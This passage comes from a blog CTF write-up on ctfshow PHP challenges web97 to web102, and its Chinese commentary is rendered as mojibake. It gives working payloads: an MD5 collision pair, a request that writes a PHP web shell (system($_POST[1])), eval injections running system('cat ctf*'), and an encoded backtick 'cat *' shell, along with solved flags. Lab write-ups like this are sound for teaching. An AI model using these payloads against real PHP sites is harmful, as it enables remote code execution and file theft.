class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨æ•°ç»„ç»•è¿‡ï¼š<code>a[]=1&amp;b[]=2</code></p><h2 id="æ–¹æ³•äºŒ-å¼ºç¢°æ’"><a href="#æ–¹æ³•äºŒ-å¼ºç¢°æ’" class="headerlink" title="æ–¹æ³•äºŒ å¼ºç¢°æ’"></a>æ–¹æ³•äºŒ å¼ºç¢°æ’</h2><p><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code><br>éœ€è¦ç”¨bpæäº¤ã€‚</p><h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><blockquote><p><a href="https://www.php.cn/php-weizijiaocheng-383293.html">https://www.php.cn/php-weizijiaocheng-383293.html</a><br><a href="https://www.php.cn/php-notebook-172859.html">https://www.php.cn/php-notebook-172859.html</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment"># å¦‚æœæœ‰GETä¼ å‚ï¼Œå°±å˜æˆPOSTä¼ å‚</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment"># å¦‚æœå‡ºä¼ å…¥flagçš„å€¼ä¸ºflagï¼Œå°†getä¼ å‚ä¿®æ”¹ä¸ºcookieä¼ å‚</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment"># åŒç†å°†getè½¬ä¸ºserver</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment"># å¦‚æœhttp_flagçš„å€¼ä¸ºflagï¼Œåˆ™å€¼ä¸ºflagï¼Œå¦åˆ™å°±æ˜¯æœ¬æ–‡ä»¶</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥ç†è§£ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123;</span><br><span class="line"><span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>;<span class="comment">//åªè¦æœ‰è¾“å…¥çš„getå‚æ•°å°±å°†getæ–¹æ³•æ”¹å˜ä¸ºpostæ–¹æ³•(ä¿®æ”¹äº†getæ–¹æ³•çš„åœ°</span></span><br><span class="line">å€)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125; i</span><br><span class="line"><span class="title function_ invoke__">f</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">&#x27;flag&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ç›´æ¥numä¼ å…¥ä¸€ä¸ªå€¼ï¼Œç„¶åå°†postä¼ å…¥<code>HTTP_FLAG=flag</code>å³å¯<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682927233986-f0da9a13-4af2-45df-bc4e-daea53d31a16.png" alt="image.png"></p><h1 id="web99-in-array"><a href="#web99-in-array" class="headerlink" title="web99 in_array"></a>web99 in_array</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥ç†è§£ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();<span class="comment">//è®¾ç½®ä¸ºæ•°ç»„</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));<span class="comment">//å‘æ•°ç»„é‡Œé¢æ’å…¥éšæœºæ•°</span></span><br><span class="line">&#125; i</span><br><span class="line"><span class="title function_ invoke__">f</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line"><span class="comment">//in_array()å‡½æ•°æœ‰æ¼æ´ æ²¡æœ‰è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•° å°±å¯ä»¥å½¢æˆè‡ªåŠ¨è½¬æ¢eg:n=1.phpè‡ªåŠ¨è½¬æ¢ä¸º1</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="comment">//å†™å…¥1.phpæ–‡ä»¶ å†…å®¹æ˜¯&lt;?php system($_POST[1]);?&gt;</span></span><br><span class="line">&#125; ?</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>in_arrayå‡½æ•°çš„æ¼æ´ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682927691590-12a4253b-84b2-416a-b2dc-d066f82cfd04.png" alt="20210125215956454.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682927847639-0305094e-2c71-4bc1-8fa8-18982aa0966f.png" alt="image.png"><br>GETä¼ å…¥ï¼š<code>n=1.php</code><br>POSTä¼ å…¥ï¼š<code>content=&lt;?php system($_POST[1]);?&gt;</code><br>ç„¶åå°±è¿›å…¥1.phpï¼Œpostä¼ å…¥ï¼š<code>1=tac fl*</code></p><h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682928476651-4a45d147-98b3-43e1-9f10-b66df6fc9322.png" alt="20210126121456572.png"><br>æ‰€ä»¥è¿™é“é¢˜åªéœ€è¦è®©v1æ˜¯truev0å°±æ˜¯trueäº†ï¼Œåé¢éƒ½ä¸ç”¨ç®¡ã€‚ç„¶åv2ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå³å¯ã€‚<br>payloadï¼š<code>?v1=1&amp;v2=system(&#39;ls&#39;)/*&amp;v3=*/;</code><br><code>?v1=1&amp;v2=system(&#39;cat ctf*&#39;)&amp;v3=;</code><br><code>?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</code><br>è¿™ä¸ªä¹Ÿè¡Œã€‚<br>æœ€åè¦å°†0x2dè¦è½¬åŒ–æˆ<code>-</code><br>ctfshow{ee9557f4-b67a-4c79-8603-e5653885d260}</p><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p><strong>ä½†æ˜¯æœ‰å‡ ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆåªèƒ½ä½¿ç”¨/</strong>/æ¥æ³¨é‡Šä¸èƒ½ç”¨//ï¼Œè€Œä¸”ä¸èƒ½å¦‚ä¸‹èµ‹å€¼ï¼š**<br><code>**?v1=1&amp;v2=system(&#39;cat ctf*&#39;);/*&amp;v3=*/**</code><br><strong>ä½†æ˜¯ç¥å¥‡çš„æ˜¯ç”¨å†™åœ¨æœ¬åœ°ä¹‹åè¿è¡Œè¿™ç§å°±å¯ä»¥äº†ã€‚</strong></p><h2 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p>åˆ©ç”¨åå°„ç±»<br>payloadï¼š<code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code><br>å…³äºåå°„ç±»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;123123123&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span>  PI=<span class="number">3.14</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getConstants</span>());  è·å–ä¸€ç»„å¸¸é‡</span><br><span class="line">è¾“å‡º</span><br><span class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;PI&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">float</span>(<span class="number">3.14</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getName</span>());    è·å–ç±»å</span><br><span class="line">è¾“å‡º</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getStaticProperties</span>()); è·å–é™æ€å±æ€§</span><br><span class="line">è¾“å‡º</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;flag&#123;123123123&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getMethods</span>()); è·å–ç±»ä¸­çš„æ–¹æ³•</span><br><span class="line">è¾“å‡º</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionMethod)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;hello&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œä¸Šä¸ªé¢˜å·®ä¸å¤šï¼Œä¹Ÿæ˜¯ç”¨åå°„ç±»è§£å†³çš„ã€‚<br><code>?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</code>ï¼Œå°†0x2dæ›¿æ¢æ‰ï¼š<br><code>3c1e313c0x2dbfc60x2d49940x2d938b0x2ddd880411ad8</code>=ã€‹<code>3c1e313c-bfc6-4994-938b-dd880411ad8</code><br>ä½†æ˜¯flagæ ¼å¼æœ€åä¸€ä¸ªæ˜¯12ä½ï¼Œå› æ­¤éœ€è¦çˆ†ç ´å‡ºæœ€ä¸€ä½ã€‚<br>0-cä¸€ä¸ªä¸€ä¸ªå°è¯•å°±è¡Œã€‚</p><h1 id="web102-isnumeric-and-isnumericç»•è¿‡"><a href="#web102-isnumeric-and-isnumericç»•è¿‡" class="headerlink" title="web102 isnumeric and isnumericç»•è¿‡"></a>web102 isnumeric and isnumericç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">  <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">  <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">  <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>substr() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚<br>call_user_func()å‡½æ•°æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨<br>file_put_contents() å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚<br>ä»£ç åˆ†æï¼šv4æ£€æµ‹æ˜¯å¦è¿›å…¥åˆ¤æ–­ã€‚v2ä¼šè¢«åˆ é™¤æ‰å‰ä¸¤ä¸ªå­—ç¬¦ï¼Œv1è°ƒç”¨æ–¹æ³•ä¼ å…¥åˆ è¿‡å­—ç¬¦çš„v2ï¼Œå†å°†ç»“æœå†™å…¥æ–‡ä»¶v3ã€‚<br>å› æ­¤æ ¸å¿ƒæ“ä½œè¯­å¥åœ¨v2ã€‚<br>ä¸Šæ¥æœ‰ä¸ªæ•°å­—æ£€æµ‹ï¼Œè¿™é‡Œè¦ä½¿ç”¨hex2binã€‚<br>php5ä¸‹is_numericå¯è¯†åˆ«16è¿›åˆ¶ï¼Œå¦‚0x2eï¼Œç„¶åè°ƒç”¨hex2binè½¬æˆå­—ç¬¦ä¸²å†™å…¥æœ¨é©¬ï¼Œä½†é¢˜ç›®ç¯å¢ƒæ²¡é…å¥½ï¼Œæ˜¯php7,æ‰€ä»¥è¦å¦æ¢æ–¹æ³•ã€‚<br>ç”¨ä¼ªåè®®å†™å…¥ï¼Œæ‰€ä»¥éœ€è¦base64ç¼–ç åè½¬æˆ16è¿›åˆ¶å…¨æ˜¯æ•°å­—çš„å­—ç¬¦ä¸²ï¼ˆä½†æ˜¯ä¸‹é¢è¿™ä¸ªä¸è¡Œï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;&lt;?=`cat *`;&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™ä¸ªä¸Šé¢çš„ä¸è¡Œï¼Œå› ä¸ºè½¬æ¢åçš„hexä¸­é™¤äº†eæœ‰å…¶ä»–çš„å­—ç¬¦ï¼Œwpä¸­æåˆ°äº†ä½¿ç”¨çš„ä»¥ä¸‹è¿™ç§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);<span class="comment">//$a=PD89YGNhdCAqYDs=</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="string">&#x27;PD89YGNhdCAqYDs&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åç”Ÿæˆçš„hexä¸²ï¼š<code>5044383959474e6864434171594473</code>ï¼ˆè¿™é‡Œçš„eä¼šè¢«å½“ä½œç§‘å­¦è®¡æ•°æ³•ï¼‰ä¸ºäº†ç»•è¿‡æˆªæ–­éœ€è¦åœ¨å‰é¢éšä¾¿åŠ 